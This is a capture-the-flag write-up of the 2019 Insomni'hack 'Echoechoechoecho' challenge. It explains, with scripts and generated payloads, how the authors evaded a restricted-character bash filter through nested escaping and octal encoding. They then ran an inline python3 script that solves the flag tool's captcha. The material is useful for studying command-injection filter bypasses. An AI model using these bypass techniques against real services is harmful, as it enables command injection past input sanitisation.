# `(?:ECHO){4}` 

Echoechoechoecho was a service at the 2019 Insomni'hack teaser with 216 points and 18 solves.

## Description

Echo echo echo echo, good luck

`nc 35.246.181.187 1337`

## The Service

```python
banner = """
                            _..._                 .-'''-.
                         .-'_..._''.             '   _    \\
       __.....__       .' .'      '.\  .       /   /` '.   \\
   .-''         '.    / .'           .'|      .   |     \  '
  /     .-''"'-.  `. . '            <  |      |   '      |  '
 /     /________\   \| |             | |      \    \     / /
 |                  || |             | | .'''-.`.   ` ..' /
 \    .-------------'. '             | |/.'''. \  '-...-'`
  \    '-.____...---. \ '.          .|  /    | |
   `.             .'   '. `._____.-'/| |     | |
     `''-...... -'       `-.______ / | |     | |
                                  `  | '.    | '.
                                     '---'   '---'
"""
```

The service allows us to run any bash code... But it has to pass this little sanitization function first:
```python
    if not all(ord(c) < 128 for c in payload):
        bye("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")
````
If we pass this check, our input can be piped to `n` bash instances (with n being user-provided):

```python
print("And how often would you like me to echo that?")
count = max(min(int(input()), 10), 0)

payload += "|bash"*count
```

That means we cannot use most chars, only use a small subset of special chars--and a lot of echos!

## Our approach

First we had to pull up a nice bash scripting cheatsheet.
devhints.io/bash helped a lot!

In the following we describe each layer we built.
Every next layer had to be escaped in such a way, that it could be echoed into the next bash instance.

### LAYER 0
It was quickly clear that we would need more special chars, especially equals signs, so in the first layer, we assigned equals to $echoecho:
`"echoecho " + r"=\=;"`.

Since we then had to replace and reuse the signs in every other layer and properly escape them, we quickly started scripting variable (`"echo" * i`) allocations.

### LAYER 1
After regaining access to infinite equals signs, we hunted down semicolons, since we only had two left:
```python
smcln = c([escape_by(r"\;;", 1)], 1)
```
with the c function being a helper to define new characters.

Since, after this layer, escaping started to get messy, so we tried to automate that too, using re.escape like:
```python
def escape_by(s, level):
    if not level:
        return s
    for i in range(level):
        s = re.escape(s)
    return s
```


### LAYER 2
With the magnificent `=` and `;` tools, we could now assign all other allowed specialchars to echo-named variables:
```python
bopen = c([escape_by(r"\(", 2), smcln], 2)
bclose = c([escape_by(r"\)", 2), smcln], 2)
plus = c([escape_by(r"\+", 2), smcln], 2)
single_quote = c([escape_by(r"\'", 2), smcln], 2)
```
which results in the following legible code (all in one line), when printed and escaped:
```bash
echo echoechoechoecho$echoecho\\\\\\\(\$echoechoecho echoechoechoechoecho$echoecho\\\\\\\)\$echoechoecho echoechoechoechoechoecho$echoecho\\\\\\\+\$echoechoecho echoechoechoechoechoechoecho$echoecho\\\\\\\'\$echoechoecho
```

### LAYER 3
We finally had regained access to all special chars and could think about how to encode the actual payload.

It was quickly clear that an octal representation (like `$'\101\101...'`) of characters is ideal, since anything else would already need chars, like an `x`for hex.

We had initially figured out the pid of our initial bash was always 8. 
We also knew from the cheat sheet that `$(($CAN_HAZ_MATHS))` can evaluate mathematical expressions in bash.
However we failed to failed to find a good way to calculate anything with the PID.

After quite a while we had the idea that an empty variable inside the math env evaluates to 0 (or probably did it by accident). For that we could use any variable, including echo. That means that `echoechoechoechoechoecho = $((echo))` assigns 0 to that echo-like variable! Success :)

We also reread the sheet and came to the conclusion that `$((++echo))` will increase the variable and return its result. Repeating this another 6 times (with increasingly long echo-like variablenames), we got placeholder for the entire octal numeric range 🎉

```python
# bopen is the palceholder evaluating to '(' bclose == ')', plus == '+', smcln == ';'
def next_num():
    return c([escape_by("$", 3), bopen, bopen, plus, plus, escape_by(r"\echo", 2), bclose, bclose, escape_by("\\", 2), smcln], 3)
```

### LAYER 4

Finally, we could encode any commands, and issue them to the server.
We did a quick ls (only 2547 characters), and found `/flag`!

But oh boy were we not done yet.

### INCEPTION

The flag was only readable by root :/ (Our user was `echolord`, because of course it was).

Next to the flag, we found `/get_flag`, a nice little commandline tool, giving us the flag.
Not.
The tool outputted roughly this, with `some_int` being.. some random int:
```bash
Please solve this little captcha:
[some_int] + [some_int] + [some_int] + [some_int] + [some_int]
[calcualted_int] != 0 :(

bye
```

That meant we had to interact with this command-line tool, but only hat single shot bash commands.
We did not get strerr output and most tools (like python) did not work.
However we knew there had to be a python somewhere, since the server was running in python - and we had no clue how to do it in bash only.

Luckily we found python3 in its usual path, and then could start scripting:

```python
from subprocess import Popen, PIPE
test = Popen(["/get_flag"], stdin=PIPE, stdout=PIPE, bufsize=1, universal_newlines=True)
print(test.stdout.readline())
q = test.stdout.readline()
print("Question:", q)
a = eval(q)
print(a)
test.stdin.write(str(a)+"\\n")
print(test.stdout.readline())
print(test.poll())
print(test.communicate("fun"))
print("Python end")
```
We spawn the program as subprocess, simply `eval` the 5 integers (favourite function <3 but still consider to use literal_eval if it is your own server) and finally print the result.

We then sent this script as encoded bash command, using:
```python
cmd = "/usr/bin/python3 -c '{}';".format(pycmd.replace("\n", ";"))
```

Due to the restricted environment, building this took forever - we did not get output in case it crashed and building a try-except in a single line in python seemed like too much work.

But in the end... we were finally presented the flag:
```
INS{echo_echoecho_echo__echoech0echo_echoechoechoecho_bashbashbashbash}
```

Thanks eboda for this nice brainf*ck and the captcha from hell.

## Prior Challenges

Sadly we did not find the writeup of last year's 34c3 challenge by eboda in similar style:
https://hack.more.systems/writeup/2017/12/30/34c3ctf-minbashmaxfun/

It might have helped ¯\\\_(ツ)_/¯.

## Epilogue

Find the script [here](./echoechoechoecho.py)

In the following, a few of the pretty generated output bytes in each iteration:
### In the First Bash (LAYER 0)
```bash
echoecho=\=; echo echoechoecho$echoecho\\\;\; echo echoechoechoecho$echoecho\\\\\\\(\$echoechoecho echoechoechoechoecho$echoecho\\\\\\\)\$echoechoecho echoechoechoechoechoecho$echoecho\\\\\\\+\$echoechoecho echoechoechoechoechoechoecho$echoecho\\\\\\\'\$echoechoecho...
```
### In the Second Bash (LAYER 1)
```bash
echoechoecho=\;; echo echoechoechoecho=\\\($echoechoecho echoechoechoechoecho=\\\)$echoechoecho echoechoechoechoechoecho=\\\+$echoechoecho echoechoechoechoechoechoecho=\\\'$echoechoecho echo echoechoechoechoechoechoechoecho=\\\$\$echoechoechoecho\$echoechoechoecho\\echo\$echoechoechoechoecho\$echoechoechoechoecho\\$echoechoecho...
```
### In the Third Bash (LAYER 2)
```bash
echoechoechoecho=\(; echoechoechoechoecho=\); echoechoechoechoechoecho=\+; echoechoechoechoechoechoecho=\'; echo echoechoechoechoechoechoechoecho=\$$echoechoechoecho$echoechoechoecho\echo$echoechoechoechoecho$echoechoechoechoecho\; echoechoechoechoechoechoechoechoecho=\$$echoechoechoecho$echoechoechoecho$echoechoechoechoechoecho$echoechoechoechoechoecho\echo$echoechoechoechoecho$echoechoechoechoecho\;...
```
### Fourth Bahs (LAYER 3)
```bash
echoechoechoechoechoechoechoecho=$((echo)); echoechoechoechoechoechoechoechoecho=$((++echo)); echoechoechoechoechoechoechoechoechoecho=$((++echo)); echoechoechoechoechoechoechoechoechoechoecho=$((++echo)); echoechoechoechoechoechoechoechoechoechoechoecho=$((++echo));
```
### FINALLY (LAYER 4)
```bash
echo $'\57\165\163\162\57\142\151\156\57\160\171\164\150\157\156\63\40\55\143\40\47\146\162\157\155\40\163\165\142\160\162\157\143\145\163\163\40\151\155\160\157\162\164\40\120\157\160\145\156\54\40\120\111\120\105\73\164\145\163\164\40\75\40\120\157\160\145\156\50\133\42\57\147\145\164\137\146\154\141\147\42\135\54\40\163\164\144\151\156\75\120\111\120\105\54\40\163\164\144\157\165\164\75\120\111\120\105\54\40\142\165\146\163\151\172\145\75\61\54\40\165\156\151\166\145\162\163\141\154\137\156\145\167\154\151\156\145\163\75\124\162\165\145\51\73\160\162\151\156\164\50\164\145\163\164\56\163\164\144\157\165\164\56\162\145\141\144\154\151\156\145\50\51\51\73\161\40\75\40\164\145\163\164\56\163\164\144\157\165\164\56\162\145\141\144\154\151\156\145\50\51\73\160\162\151\156\164\50\42\121\165\145\163\164\151\157\156\72\42\54\40\161\51\73\141\40\75\40\145\166\141\154\50\161\51\73\160\162\151\156\164\50\141\51\73\164\145\163\164\56\163\164\144\151\156\56\167\162\151\164\145\50\163\164\162\50\141\51\53\42\134\156\42\51\73\160\162\151\156\164\50\164\145\163\164\56\163\164\144\157\165\164\56\162\145\141\144\154\151\156\145\50\51\51\73\160\162\151\156\164\50\164\145\163\164\56\160\157\154\154\50\51\51\73\160\162\151\156\164\50\164\145\163\164\56\143\157\155\155\165\156\151\143\141\164\145\50\42\167\150\157\141\155\151\42\51\51\73\160\162\151\156\164\50\42\120\171\164\150\157\156\40\145\156\144\42\51\73\47\73\40\167\150\157\141\155\151'
```
### FINALLY 
```bash
/usr/bin/python3 -c 'from subprocess import Popen, PIPE;test = Popen(["/get_flag"], stdin=PIPE, stdout=PIPE, bufsize=1, universal_newlines=True);print(test.stdout.readline());q = test.stdout.readline();print("Question:", q);a = eval(q);print(a);test.stdin.write(str(a)+"\n");print(test.stdout.readline());print(test.poll());print(test.communicate("fun"));print("Python end");';
```
